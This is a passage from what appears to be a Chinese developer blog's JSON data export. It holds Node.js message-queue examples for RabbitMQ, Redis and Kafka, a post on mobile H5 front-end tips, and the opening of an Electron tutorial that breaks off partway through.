\u9002\u7528\u573a\u666f |\\n|------|------|---------|\\n| **RabbitMQ** | \u529f\u80fd\u4e30\u5bcc\uff0c\u6613\u7528 | \u4e2d\u5c0f\u89c4\u6a21 |\\n| **Kafka** | \u9ad8\u541e\u5410\uff0c\u6301\u4e45\u5316 | \u65e5\u5fd7\u3001\u5927\u6570\u636e |\\n| **Redis** | \u7b80\u5355\u8f7b\u91cf | \u7b80\u5355\u961f\u5217 |\\n| **RocketMQ** | \u4e8b\u52a1\u6d88\u606f | \u7535\u5546 |\\n\\n---\\n\\n## \ud83d\udc30 RabbitMQ\\n\\n### \u5b89\u88c5\\n\\n```bash\\n# Docker\\ndocker run -d --name rabbitmq \\\\\\n  -p 5672:5672 \\\\\\n  -p 15672:15672 \\\\\\n  rabbitmq:management\\n```\\n\\n### Node.js \u751f\u4ea7\u8005\\n\\n```javascript\\nconst amqp = require(\'amqplib\');\\n\\nasync function sendMessage() {\\n  const connection = await amqp.connect(\'amqp://localhost\');\\n  const channel = await connection.createChannel();\\n  \\n  const queue = \'task_queue\';\\n  const message = JSON.stringify({ task: \'process_order\', orderId: 123 });\\n\\n  // \u58f0\u660e\u961f\u5217\\n  await channel.assertQueue(queue, { durable: true });\\n  \\n  // \u53d1\u9001\u6d88\u606f\\n  channel.sendToQueue(queue, Buffer.from(message), {\\n    persistent: true, // \u6d88\u606f\u6301\u4e45\u5316\\n  });\\n\\n  console.log(\'Sent:\', message);\\n  \\n  setTimeout(() => {\\n    connection.close();\\n  }, 500);\\n}\\n\\nsendMessage();\\n```\\n\\n### Node.js \u6d88\u8d39\u8005\\n\\n```javascript\\nconst amqp = require(\'amqplib\');\\n\\nasync function consume() {\\n  const connection = await amqp.connect(\'amqp://localhost\');\\n  const channel = await connection.createChannel();\\n  \\n  const queue = \'task_queue\';\\n\\n  await channel.assertQueue(queue, { durable: true });\\n  \\n  // \u6bcf\u6b21\u53ea\u5904\u7406\u4e00\u6761\u6d88\u606f\\n  channel.prefetch(1);\\n\\n  console.log(\'Waiting for messages...\');\\n\\n  channel.consume(queue, async (msg) => {\\n    const content = JSON.parse(msg.content.toString());\\n    console.log(\'Received:\', content);\\n\\n    // \u5904\u7406\u6d88\u606f\\n    await processTask(content);\\n\\n    // \u786e\u8ba4\u6d88\u606f\u5df2\u5904\u7406\\n    channel.ack(msg);\\n  });\\n}\\n\\nconsume();\\n```\\n\\n### \u53d1\u5e03/\u8ba2\u9605\u6a21\u5f0f\\n\\n```javascript\\n// \u53d1\u5e03\u8005\\nasync function publish() {\\n  const connection = await amqp.connect(\'amqp://localhost\');\\n  const channel = await connection.createChannel();\\n  \\n  const exchange = \'logs\';\\n  const message = \'Hello World!\';\\n\\n  // \u58f0\u660e\u4ea4\u6362\u673a\\n  await channel.assertExchange(exchange, \'fanout\', { durable: false });\\n  \\n  // \u53d1\u5e03\u6d88\u606f\\n  channel.publish(exchange, \'\', Buffer.from(message));\\n  console.log(\'Published:\', message);\\n}\\n\\n// \u8ba2\u9605\u8005\\nasync function subscribe() {\\n  const connection = await amqp.connect(\'amqp://localhost\');\\n  const channel = await connection.createChannel();\\n  \\n  const exchange = \'logs\';\\n\\n  await channel.assertExchange(exchange, \'fanout\', { durable: false });\\n  \\n  // \u521b\u5efa\u4e34\u65f6\u961f\u5217\\n  const { queue } = await channel.assertQueue(\'\', { exclusive: true });\\n  \\n  // \u7ed1\u5b9a\u5230\u4ea4\u6362\u673a\\n  channel.bindQueue(queue, exchange, \'\');\\n\\n  channel.consume(queue, (msg) => {\\n    console.log(\'Received:\', msg.content.toString());\\n  }, { noAck: true });\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcee Redis \u961f\u5217\\n\\n### \u7b80\u5355\u961f\u5217\\n\\n```javascript\\nconst Redis = require(\'ioredis\');\\nconst redis = new Redis();\\n\\n// \u751f\u4ea7\u8005\\nasync function produce(message) {\\n  await redis.lpush(\'queue:tasks\', JSON.stringify(message));\\n}\\n\\n// \u6d88\u8d39\u8005\\nasync function consume() {\\n  while (true) {\\n    // \u963b\u585e\u5f0f\u83b7\u53d6\\n    const [, message] = await redis.brpop(\'queue:tasks\', 0);\\n    const data = JSON.parse(message);\\n    await processTask(data);\\n  }\\n}\\n```\\n\\n### \u53ef\u9760\u961f\u5217\uff08\u5e26\u786e\u8ba4\uff09\\n\\n```javascript\\n// \u751f\u4ea7\u8005\\nasync function produce(message) {\\n  const id = Date.now().toString();\\n  await redis.lpush(\'queue:pending\', JSON.stringify({ id, ...message }));\\n}\\n\\n// \u6d88\u8d39\u8005\\nasync function consume() {\\n  while (true) {\\n    // \u4ece pending \u79fb\u52a8\u5230 processing\\n    const message = await redis.brpoplpush(\\n      \'queue:pending\',\\n      \'queue:processing\',\\n      0\\n    );\\n    \\n    const data = JSON.parse(message);\\n    \\n    try {\\n      await processTask(data);\\n      // \u5904\u7406\u6210\u529f\uff0c\u4ece processing \u79fb\u9664\\n      await redis.lrem(\'queue:processing\', 1, message);\\n    } catch (error) {\\n      // \u5904\u7406\u5931\u8d25\uff0c\u79fb\u56de pending\\n      await redis.lrem(\'queue:processing\', 1, message);\\n      await redis.lpush(\'queue:pending\', message);\\n    }\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcca Kafka\\n\\n### \u6982\u5ff5\\n\\n```markdown\\n- Topic\uff1a\u6d88\u606f\u4e3b\u9898\\n- Partition\uff1a\u5206\u533a\uff0c\u5e76\u884c\u5904\u7406\\n- Consumer Group\uff1a\u6d88\u8d39\u8005\u7ec4\\n- Offset\uff1a\u6d88\u606f\u504f\u79fb\u91cf\\n```\\n\\n### Node.js \u793a\u4f8b\\n\\n```javascript\\nconst { Kafka } = require(\'kafkajs\');\\n\\nconst kafka = new Kafka({\\n  clientId: \'my-app\',\\n  brokers: [\'localhost:9092\'],\\n});\\n\\n// \u751f\u4ea7\u8005\\nconst producer = kafka.producer();\\n\\nasync function sendMessage() {\\n  await producer.connect();\\n  \\n  await producer.send({\\n    topic: \'orders\',\\n    messages: [\\n      { key: \'order-1\', value: JSON.stringify({ id: 1, amount: 100 }) },\\n    ],\\n  });\\n  \\n  await producer.disconnect();\\n}\\n\\n// \u6d88\u8d39\u8005\\nconst consumer = kafka.consumer({ groupId: \'order-group\' });\\n\\nasync function consume() {\\n  await consumer.connect();\\n  await consumer.subscribe({ topic: \'orders\', fromBeginning: true });\\n\\n  await consumer.run({\\n    eachMessage: async ({ topic, partition, message }) => {\\n      console.log({\\n        topic,\\n        partition,\\n        offset: message.offset,\\n        value: message.value.toString(),\\n      });\\n    },\\n  });\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfaf \u4f7f\u7528\u573a\u666f\\n\\n### 1. \u5f02\u6b65\u5904\u7406\\n\\n```javascript\\n// \u540c\u6b65\u5904\u7406 - \u7528\u6237\u7b49\u5f85\u65f6\u95f4\u957f\\nasync function createOrder(order) {\\n  await saveOrder(order);\\n  await sendEmail(order);      // \u6162\\n  await updateInventory(order); // \u6162\\n  await notifySupplier(order);  // \u6162\\n  return order;\\n}\\n\\n// \u5f02\u6b65\u5904\u7406 - \u6838\u5fc3\u6d41\u7a0b\u5feb\u901f\u8fd4\u56de\\nasync function createOrder(order) {\\n  await saveOrder(order);\\n  \\n  // \u975e\u6838\u5fc3\u6d41\u7a0b\u653e\u5165\u961f\u5217\\n  await queue.send(\'order.created\', order);\\n  \\n  return order;\\n}\\n\\n// \u6d88\u8d39\u8005\u5904\u7406\\nconsumer.on(\'order.created\', async (order) => {\\n  await sendEmail(order);\\n  await updateInventory(order);\\n  await notifySupplier(order);\\n});\\n```\\n\\n### 2. \u6d41\u91cf\u524a\u5cf0\\n\\n```javascript\\n// \u79d2\u6740\u573a\u666f\\nasync function handleSeckill(userId, productId) {\\n  // \u6240\u6709\u8bf7\u6c42\u5148\u5165\u961f\\n  await queue.send(\'seckill\', { userId, productId });\\n  return { message: \'\u6b63\u5728\u6392\u961f\u5904\u7406\' };\\n}\\n\\n// \u6d88\u8d39\u8005\u63a7\u5236\u5904\u7406\u901f\u5ea6\\nconsumer.on(\'seckill\', async (data) => {\\n  // \u6bcf\u79d2\u5904\u7406 100 \u4e2a\\n  await processOrder(data);\\n});\\n```\\n\\n### 3. \u5e94\u7528\u89e3\u8026\\n\\n```javascript\\n// \u7d27\u8026\u5408\\nclass OrderService {\\n  async createOrder(order) {\\n    await this.orderRepo.save(order);\\n    await this.emailService.send(order);    // \u76f4\u63a5\u4f9d\u8d56\\n    await this.inventoryService.update(order); // \u76f4\u63a5\u4f9d\u8d56\\n  }\\n}\\n\\n// \u677e\u8026\u5408\\nclass OrderService {\\n  async createOrder(order) {\\n    await this.orderRepo.save(order);\\n    await this.eventBus.publish(\'order.created\', order);\\n  }\\n}\\n\\n// \u5176\u4ed6\u670d\u52a1\u72ec\u7acb\u8ba2\u9605\\nemailService.subscribe(\'order.created\', handleEmail);\\ninventoryService.subscribe(\'order.created\', handleInventory);\\n```\\n\\n---\\n\\n## \u26a0\ufe0f \u6ce8\u610f\u4e8b\u9879\\n\\n### \u6d88\u606f\u4e22\u5931\\n\\n```markdown\\n- \u751f\u4ea7\u8005\u786e\u8ba4\\n- \u6d88\u606f\u6301\u4e45\u5316\\n- \u6d88\u8d39\u8005\u624b\u52a8\u786e\u8ba4\\n```\\n\\n### \u91cd\u590d\u6d88\u8d39\\n\\n```markdown\\n- \u6d88\u8d39\u8005\u5e42\u7b49\u8bbe\u8ba1\\n- \u4f7f\u7528\u552f\u4e00 ID \u53bb\u91cd\\n- \u6570\u636e\u5e93\u552f\u4e00\u7ea6\u675f\\n```\\n\\n### \u6d88\u606f\u987a\u5e8f\\n\\n```markdown\\n- \u5355\u961f\u5217\u5355\u6d88\u8d39\u8005\\n- \u540c\u4e00\u4e1a\u52a1\u53d1\u9001\u5230\u540c\u4e00\u5206\u533a\\n```\\n\\n---\\n\\n## \ud83d\udccb \u9009\u578b\u5efa\u8bae\\n\\n| \u573a\u666f | \u63a8\u8350 |\\n|------|------|\\n| \u7b80\u5355\u961f\u5217 | Redis |\\n| \u53ef\u9760\u6d88\u606f | RabbitMQ |\\n| \u9ad8\u541e\u5410 | Kafka |\\n| \u4e8b\u52a1\u6d88\u606f | RocketMQ |\\n\\n---\\n\\n\u6d88\u606f\u961f\u5217\u662f\u6784\u5efa\u53ef\u6269\u5c55\u7cfb\u7edf\u7684\u5229\u5668\uff0c\u4f46\u4e5f\u589e\u52a0\u4e86\u590d\u6742\u5ea6\u3002\u6839\u636e\u5b9e\u9645\u9700\u6c42\u9009\u62e9\u5408\u9002\u7684\u65b9\u6848\u3002"},{"id":"h5-mobile-development","metadata":{"permalink":"/blog/h5-mobile-development","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-08-01-h5-mobile.md","source":"@site/blog/2025-08-01-h5-mobile.md","title":"\u79fb\u52a8\u7aef H5 \u5f00\u53d1\u6280\u5de7","description":"\u79fb\u52a8\u7aef H5 \u5f00\u53d1\u6709\u8bb8\u591a\u5751\u548c\u6280\u5de7\u3002\u672c\u6587\u603b\u7ed3\u79fb\u52a8\u7aef\u5f00\u53d1\u7684\u5e38\u89c1\u95ee\u9898\u548c\u89e3\u51b3\u65b9\u6848\u3002","date":"2025-08-01T00:00:00.000Z","tags":[{"inline":true,"label":"H5","permalink":"/blog/tags/h-5"},{"inline":true,"label":"\u79fb\u52a8\u7aef","permalink":"/blog/tags/\u79fb\u52a8\u7aef"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":4.07,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"h5-mobile-development","title":"\u79fb\u52a8\u7aef H5 \u5f00\u53d1\u6280\u5de7","authors":"mason","tags":["H5","\u79fb\u52a8\u7aef","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"\u6d88\u606f\u961f\u5217\u5165\u95e8\u6307\u5357","permalink":"/blog/message-queue-intro"},"nextItem":{"title":"Electron \u684c\u9762\u5e94\u7528\u5165\u95e8","permalink":"/blog/electron-intro"}},"content":"\u79fb\u52a8\u7aef H5 \u5f00\u53d1\u6709\u8bb8\u591a\u5751\u548c\u6280\u5de7\u3002\u672c\u6587\u603b\u7ed3\u79fb\u52a8\u7aef\u5f00\u53d1\u7684\u5e38\u89c1\u95ee\u9898\u548c\u89e3\u51b3\u65b9\u6848\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83d\udcf1 \u89c6\u53e3\u914d\u7f6e\\n\\n### \u57fa\u7840\u914d\u7f6e\\n\\n```html\\n<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\\">\\n\\n\x3c!-- iOS \u76f8\u5173 --\x3e\\n<meta name=\\"apple-mobile-web-app-capable\\" content=\\"yes\\">\\n<meta name=\\"apple-mobile-web-app-status-bar-style\\" content=\\"default\\">\\n<meta name=\\"format-detection\\" content=\\"telephone=no, email=no\\">\\n```\\n\\n### \u5b89\u5168\u533a\u57df\\n\\n```css\\n/* \u9002\u914d iPhone \u5218\u6d77\u5c4f */\\nbody {\\n  padding-top: env(safe-area-inset-top);\\n  padding-bottom: env(safe-area-inset-bottom);\\n  padding-left: env(safe-area-inset-left);\\n  padding-right: env(safe-area-inset-right);\\n}\\n\\n/* \u56fa\u5b9a\u5e95\u90e8\u680f */\\n.bottom-bar {\\n  position: fixed;\\n  bottom: 0;\\n  left: 0;\\n  right: 0;\\n  padding-bottom: env(safe-area-inset-bottom);\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcd0 \u79fb\u52a8\u7aef\u9002\u914d\\n\\n### rem \u65b9\u6848\\n\\n```javascript\\n// \u52a8\u6001\u8bbe\u7f6e\u6839\u5b57\u4f53\u5927\u5c0f\\nfunction setRem() {\\n  const width = document.documentElement.clientWidth;\\n  const fontSize = width / 375 * 16; // \u4ee5 375 \u4e3a\u57fa\u51c6\\n  document.documentElement.style.fontSize = `${fontSize}px`;\\n}\\n\\nsetRem();\\nwindow.addEventListener(\'resize\', setRem);\\n```\\n\\n```css\\n/* \u4f7f\u7528 rem */\\n.container {\\n  width: 23.4375rem; /* 375px */\\n  padding: 1rem;     /* 16px */\\n}\\n```\\n\\n### vw \u65b9\u6848\\n\\n```css\\n/* \u76f4\u63a5\u4f7f\u7528 vw */\\n.container {\\n  width: 100vw;\\n  padding: 4.267vw; /* 16/375*100 */\\n}\\n\\n/* PostCSS \u63d2\u4ef6\u81ea\u52a8\u8f6c\u6362 */\\n/* postcss-px-to-viewport */\\n.container {\\n  width: 375px; /* \u81ea\u52a8\u8f6c\u4e3a 100vw */\\n  padding: 16px; /* \u81ea\u52a8\u8f6c\u4e3a 4.267vw */\\n}\\n```\\n\\n---\\n\\n## \ud83d\udc46 \u89e6\u6478\u4e8b\u4ef6\\n\\n### \u70b9\u51fb\u7a7f\u900f\\n\\n```javascript\\n// \u95ee\u9898\uff1a\u70b9\u51fb\u540e 300ms \u5ef6\u8fdf\\n// \u89e3\u51b3\u65b9\u6848 1\uff1afastclick\\nimport FastClick from \'fastclick\';\\nFastClick.attach(document.body);\\n\\n// \u89e3\u51b3\u65b9\u6848 2\uff1atouch-action\\n.button {\\n  touch-action: manipulation;\\n}\\n\\n// \u89e3\u51b3\u65b9\u6848 3\uff1a\u4f7f\u7528 touchend\\nelement.addEventListener(\'touchend\', (e) => {\\n  e.preventDefault();\\n  handleClick();\\n});\\n```\\n\\n### \u6ed1\u52a8\u64cd\u4f5c\\n\\n```javascript\\nlet startX, startY;\\n\\nelement.addEventListener(\'touchstart\', (e) => {\\n  startX = e.touches[0].clientX;\\n  startY = e.touches[0].clientY;\\n});\\n\\nelement.addEventListener(\'touchend\', (e) => {\\n  const endX = e.changedTouches[0].clientX;\\n  const endY = e.changedTouches[0].clientY;\\n  \\n  const deltaX = endX - startX;\\n  const deltaY = endY - startY;\\n  \\n  if (Math.abs(deltaX) > Math.abs(deltaY)) {\\n    if (deltaX > 50) {\\n      console.log(\'\u53f3\u6ed1\');\\n    } else if (deltaX < -50) {\\n      console.log(\'\u5de6\u6ed1\');\\n    }\\n  }\\n});\\n```\\n\\n---\\n\\n## \ud83d\udcdc \u6eda\u52a8\u95ee\u9898\\n\\n### \u5f39\u6027\u6eda\u52a8\\n\\n```css\\n/* iOS \u5f39\u6027\u6eda\u52a8 */\\n.scroll-container {\\n  -webkit-overflow-scrolling: touch;\\n  overflow-y: auto;\\n}\\n```\\n\\n### \u7981\u6b62\u9875\u9762\u6eda\u52a8\\n\\n```javascript\\n// \u5f39\u7a97\u65f6\u7981\u6b62\u80cc\u666f\u6eda\u52a8\\nfunction preventScroll(prevent) {\\n  if (prevent) {\\n    document.body.style.overflow = \'hidden\';\\n    document.body.style.position = \'fixed\';\\n    document.body.style.width = \'100%\';\\n  } else {\\n    document.body.style.overflow = \'\';\\n    document.body.style.position = \'\';\\n    document.body.style.width = \'\';\\n  }\\n}\\n```\\n\\n### \u6eda\u52a8\u7a7f\u900f\\n\\n```css\\n/* \u5f39\u7a97\u5bb9\u5668 */\\n.modal {\\n  position: fixed;\\n  top: 0;\\n  left: 0;\\n  right: 0;\\n  bottom: 0;\\n  overflow: hidden;\\n}\\n\\n/* \u5f39\u7a97\u5185\u5bb9\u53ef\u6eda\u52a8 */\\n.modal-content {\\n  max-height: 80vh;\\n  overflow-y: auto;\\n  overscroll-behavior: contain;\\n}\\n```\\n\\n---\\n\\n## \u2328\ufe0f \u8f93\u5165\u6846\u95ee\u9898\\n\\n### \u8f6f\u952e\u76d8\u906e\u6321\\n\\n```javascript\\n// \u8f93\u5165\u6846\u83b7\u5f97\u7126\u70b9\u65f6\u6eda\u52a8\u5230\u53ef\u89c6\u533a\u57df\\ninput.addEventListener(\'focus\', () => {\\n  setTimeout(() => {\\n    input.scrollIntoView({ behavior: \'smooth\', block: \'center\' });\\n  }, 300);\\n});\\n```\\n\\n### iOS \u8f93\u5165\u6846\u653e\u5927\\n\\n```css\\n/* \u5b57\u4f53\u5c0f\u4e8e 16px \u4f1a\u89e6\u53d1\u653e\u5927 */\\ninput, textarea, select {\\n  font-size: 16px;\\n}\\n```\\n\\n### \u952e\u76d8\u6536\u8d77\\n\\n```javascript\\n// \u70b9\u51fb\u5176\u4ed6\u533a\u57df\u6536\u8d77\u952e\u76d8\\ndocument.addEventListener(\'touchstart\', (e) => {\\n  if (!e.target.matches(\'input, textarea\')) {\\n    document.activeElement?.blur();\\n  }\\n});\\n```\\n\\n---\\n\\n## \ud83d\uddbc\ufe0f \u56fe\u7247\u5904\u7406\\n\\n### \u9ad8\u6e05\u5c4f\u9002\u914d\\n\\n```html\\n\x3c!-- 2x/3x \u56fe\u7247 --\x3e\\n<img \\n  src=\\"image.png\\"\\n  srcset=\\"image@2x.png 2x, image@3x.png 3x\\"\\n  alt=\\"\u56fe\u7247\\"\\n>\\n\\n\x3c!-- picture \u6807\u7b7e --\x3e\\n<picture>\\n  <source media=\\"(min-resolution: 3dppx)\\" srcset=\\"image@3x.png\\">\\n  <source media=\\"(min-resolution: 2dppx)\\" srcset=\\"image@2x.png\\">\\n  <img src=\\"image.png\\" alt=\\"\u56fe\u7247\\">\\n</picture>\\n```\\n\\n### \u56fe\u7247\u61d2\u52a0\u8f7d\\n\\n```html\\n<img data-src=\\"image.jpg\\" class=\\"lazyload\\" alt=\\"\u56fe\u7247\\">\\n\\n<script>\\nconst observer = new IntersectionObserver((entries) => {\\n  entries.forEach(entry => {\\n    if (entry.isIntersecting) {\\n      const img = entry.target;\\n      img.src = img.dataset.src;\\n      observer.unobserve(img);\\n    }\\n  });\\n});\\n\\ndocument.querySelectorAll(\'.lazyload\').forEach(img => {\\n  observer.observe(img);\\n});\\n<\/script>\\n```\\n\\n---\\n\\n## \ud83c\udfa8 1px \u8fb9\u6846\\n\\n```css\\n/* \u95ee\u9898\uff1a\u79fb\u52a8\u7aef 1px \u770b\u8d77\u6765\u5f88\u7c97 */\\n\\n/* \u65b9\u6848 1\uff1atransform */\\n.border-1px {\\n  position: relative;\\n}\\n\\n.border-1px::after {\\n  content: \'\';\\n  position: absolute;\\n  left: 0;\\n  bottom: 0;\\n  width: 100%;\\n  height: 1px;\\n  background: #ddd;\\n  transform: scaleY(0.5);\\n  transform-origin: 0 0;\\n}\\n\\n/* \u65b9\u6848 2\uff1abox-shadow */\\n.border-1px {\\n  box-shadow: 0 1px 0 0 #ddd;\\n}\\n\\n/* \u65b9\u6848 3\uff1aviewport \u7f29\u653e */\\n<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=0.5\\">\\n```\\n\\n---\\n\\n## \ud83d\udcf1 \u8bbe\u5907\u5224\u65ad\\n\\n```javascript\\n// \u5224\u65ad\u8bbe\u5907\\nconst isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);\\nconst isAndroid = /Android/i.test(navigator.userAgent);\\nconst isWeChat = /MicroMessenger/i.test(navigator.userAgent);\\n\\n// \u5224\u65ad\u662f\u5426\u662f\u79fb\u52a8\u7aef\\nconst isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);\\n\\n// \u5224\u65ad\u6a2a\u7ad6\u5c4f\\nfunction getOrientation() {\\n  return window.innerWidth > window.innerHeight ? \'landscape\' : \'portrait\';\\n}\\n\\nwindow.addEventListener(\'orientationchange\', () => {\\n  console.log(\'Orientation:\', getOrientation());\\n});\\n```\\n\\n---\\n\\n## \ud83d\udd17 \u5524\u8d77 APP\\n\\n```javascript\\n// \u901a\u7528\u65b9\u6848\\nfunction openApp(schemeUrl, downloadUrl) {\\n  const iframe = document.createElement(\'iframe\');\\n  iframe.style.display = \'none\';\\n  iframe.src = schemeUrl;\\n  document.body.appendChild(iframe);\\n\\n  setTimeout(() => {\\n    document.body.removeChild(iframe);\\n    // \u6ca1\u6709\u5524\u8d77\u5219\u8df3\u8f6c\u4e0b\u8f7d\\n    window.location.href = downloadUrl;\\n  }, 2000);\\n}\\n\\n// \u4f7f\u7528\\nopenApp(\'myapp://path/to/page\', \'https://app.example.com/download\');\\n```\\n\\n```html\\n\x3c!-- Universal Links (iOS) --\x3e\\n<a href=\\"https://app.example.com/path\\">\u6253\u5f00 APP</a>\\n\\n\x3c!-- App Links (Android) --\x3e\\n<a href=\\"intent://path#Intent;scheme=myapp;package=com.example.app;end\\">\u6253\u5f00 APP</a>\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u8c03\u8bd5\u5de5\u5177\\n\\n| \u5de5\u5177 | \u7528\u9014 |\\n|------|------|\\n| vConsole | \u79fb\u52a8\u7aef\u8c03\u8bd5\u9762\u677f |\\n| eruda | \u79fb\u52a8\u7aef\u8c03\u8bd5\u9762\u677f |\\n| Chrome \u8fdc\u7a0b\u8c03\u8bd5 | Android \u8bbe\u5907 |\\n| Safari \u5f00\u53d1\u8005\u5de5\u5177 | iOS \u8bbe\u5907 |\\n| Charles/Fiddler | \u6293\u5305 |\\n\\n### vConsole \u4f7f\u7528\\n\\n```javascript\\nimport VConsole from \'vconsole\';\\n\\nif (process.env.NODE_ENV === \'development\') {\\n  new VConsole();\\n}\\n```\\n\\n---\\n\\n## \u2705 \u68c0\u67e5\u6e05\u5355\\n\\n```markdown\\n- [ ] viewport \u6b63\u786e\u914d\u7f6e\\n- [ ] \u5b89\u5168\u533a\u57df\u9002\u914d\\n- [ ] 1px \u8fb9\u6846\u5904\u7406\\n- [ ] \u56fe\u7247\u9ad8\u6e05\u9002\u914d\\n- [ ] \u8f6f\u952e\u76d8\u5904\u7406\\n- [ ] \u6eda\u52a8\u7a7f\u900f\u5904\u7406\\n- [ ] \u70b9\u51fb\u5ef6\u8fdf\u5904\u7406\\n- [ ] \u8bbe\u5907\u517c\u5bb9\u6d4b\u8bd5\\n```\\n\\n---\\n\\n\u79fb\u52a8\u7aef H5 \u5f00\u53d1\u7ec6\u8282\u5f88\u591a\uff0c\u591a\u5728\u771f\u673a\u4e0a\u6d4b\u8bd5\uff0c\u9047\u5230\u95ee\u9898\u5584\u7528\u641c\u7d22\u3002"},{"id":"electron-intro","metadata":{"permalink":"/blog/electron-intro","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-07-01-electron.md","source":"@site/blog/2025-07-01-electron.md","title":"Electron \u684c\u9762\u5e94\u7528\u5165\u95e8","description":"Electron \u8ba9\u4f60\u7528 Web \u6280\u672f\u6784\u5efa\u8de8\u5e73\u53f0\u684c\u9762\u5e94\u7528\u3002\u672c\u6587\u4ecb\u7ecd Electron \u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5f00\u53d1\u6d41\u7a0b\u3002","date":"2025-07-01T00:00:00.000Z","tags":[{"inline":true,"label":"Electron","permalink":"/blog/tags/electron"},{"inline":true,"label":"\u684c\u9762\u5e94\u7528","permalink":"/blog/tags/\u684c\u9762\u5e94\u7528"},{"inline":true,"label":"\u8de8\u5e73\u53f0","permalink":"/blog/tags/\u8de8\u5e73\u53f0"}],"readingTime":3.64,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"electron-intro","title":"Electron \u684c\u9762\u5e94\u7528\u5165\u95e8","authors":"mason","tags":["Electron","\u684c\u9762\u5e94\u7528","\u8de8\u5e73\u53f0"]},"unlisted":false,"prevItem":{"title":"\u79fb\u52a8\u7aef H5 \u5f00\u53d1\u6280\u5de7","permalink":"/blog/h5-mobile-development"},"nextItem":{"title":"Serverless \u5e94\u7528\u5f00\u53d1\u6307\u5357","permalink":"/blog/serverless-guide"}},"content":"Electron \u8ba9\u4f60\u7528 Web \u6280\u672f\u6784\u5efa\u8de8\u5e73\u53f0\u684c\u9762\u5e94\u7528\u3002\u672c\u6587\u4ecb\u7ecd Electron \u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5f00\u53d1\u6d41\u7a0b\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4ec0\u4e48\u662f Electron\\n\\n```markdown\\nElectron = Chromium + Node.js + Native APIs\\n\\n\u7279\u70b9\uff1a\\n- \u4f7f\u7528 HTML/CSS/JS \u5f00\u53d1\\n- \u8de8\u5e73\u53f0\uff08Windows/macOS/Linux\uff09\\n- \u8bbf\u95ee\u539f\u751f API\\n- \u81ea\u52a8\u66f4\u65b0\\n```\\n\\n### \u77e5\u540d\u5e94\u7528\\n\\n```markdown\\n- VS Code\\n- Slack\\n- Discord\\n- Notion\\n- Figma Desktop\\n```\\n\\n---\\n\\n## \ud83d\ude80 \u5feb\u901f\u5f00\u59cb\\n\\n### \u521b\u5efa\u9879\u76ee\\n\\n```bash\\nmkdir my-electron-app && cd my-electron-app\\nnpm init -y\\nnpm install electron --save-dev\\n```\\n\\n### \u9879\u76ee\u7ed3\u6784\\n\\n```\\nmy-electron-app/\\n\u251c\u2500\u2500 package.json\\n\u251c\u2500\u2500 main.js          # \u4e3b\u8fdb\u7a0b\\n\u251c\u2500\u2500 preload.js       # \u9884\u52a0\u8f7d\u811a\u672c\\n\u251c\u2500\u2500 renderer/\\n\u2502   \u251c\u2500\u2500 index.html   # \u9875\u9762\\n\u2502   \u251c\u2500\u2500 style.css\\n\u2502   \u2514\u2500\u2500 renderer.js  # \u6e32\u67d3\u8fdb\u7a0b\\n\u2514\u2500\u2500 assets/\\n    \u2514\u2500\u2500 icon.png\\n```\\n\\n### package.json\\n\\n```json\\n{\\n  \\"name\\": \\"my-electron-app\\",\\n  \\"version\\": \\"1.0.0\\",\\n  \\"main\\": \\"main.js\\",\\n  \\"scripts\\": {\\n    \\"start\\": \\"electron .\\",\\n    \\"build\\": \\"electron-builder\\"\\n  },\\n  \\"devDependencies\\": {\\n    \\"electron\\": \\"^28.0.0\\",\\n    \\"electron-builder\\": \\"^24.0.0\\"\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u4e3b\u8fdb\u7a0b\\n\\n```javascript\\n// main.js\\nconst { app, BrowserWindow, ipcMain } = require(\'electron\');\\nconst path = require(\'path\');\\n\\nlet mainWindow;\\n\\nfunction createWindow() {\\n  mainWindow = new BrowserWindow({\\n    width: 1200,\\n    height: 800,\\n    webPreferences: {\\n      preload: path.join(__dirname, \'preload.js\'),\\n      contextIsolation: true,\\n      nodeIntegration: false,\\n    },\\n  });\\n\\n  mainWindow.loadFile(\'renderer/index.html\');\\n\\n  // \u5f00\u53d1\u65f6\u6253\u5f00 DevTools\\n  if (process.env.NODE_ENV === \'development\') {\\n    mainWindow.webContents.openDevTools();\\n  }\\n}\\n\\napp.whenReady().then(() => {\\n  createWindow();\\n\\n  app.on(\'activate\', () => {\\n    if (BrowserWindow.getAllWindows().length === 0) {\\n      createWindow();\\n    }\\n  });\\n});\\n\\napp.on(\'window-all-closed\', () => {\\n  if (process.platform !== \'darwin\') {\\n    app.quit();\\n  }\\n});\\n\\n// IPC \u901a\u4fe1\\nipcMain.handle(\'read-file\', async (event, filePath) => {\\n  const fs = require(\'fs\').promises;\\n  return await fs.readFile(filePath, \'utf-8\');\\n});\\n```\\n\\n---\\n\\n## \ud83c\udf09 \u9884\u52a0\u8f7d\u811a\u672c\\n\\n```javascript\\n// preload.js\\nconst { contextBridge, ipcRenderer } = require(\'electron\');\\n\\n// \u66b4\u9732\u5b89\u5168\u7684 API 